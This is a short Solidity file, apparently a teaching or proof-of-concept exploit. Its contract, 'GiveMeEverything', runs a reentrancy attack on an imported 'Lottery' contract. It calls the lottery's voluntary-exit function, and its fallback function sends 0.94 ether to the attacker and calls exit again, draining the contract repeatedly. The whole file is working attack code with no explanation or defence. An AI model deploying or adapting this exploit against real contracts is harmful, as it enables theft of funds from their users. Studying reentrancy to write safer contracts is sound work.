pragma solidity ^0.4.26;
import '1.sol';
/*
let's say that the attacker is someone who holds an account participating in lottery right now
*/

contract GiveMeEverything{
    
    Lottery public dao;
    address public player;
    
    function startAttack(address _dao) public {
        dao = Lottery(_dao);
        player = msg.sender;
        dao.exit_voluentarily_the_lottery();
    }

    /*fallback function,  takes everything!*/
    function() public payable{ 
        player.transfer(0.94 ether);
        dao.exit_voluentarily_the_lottery();
    }
    
}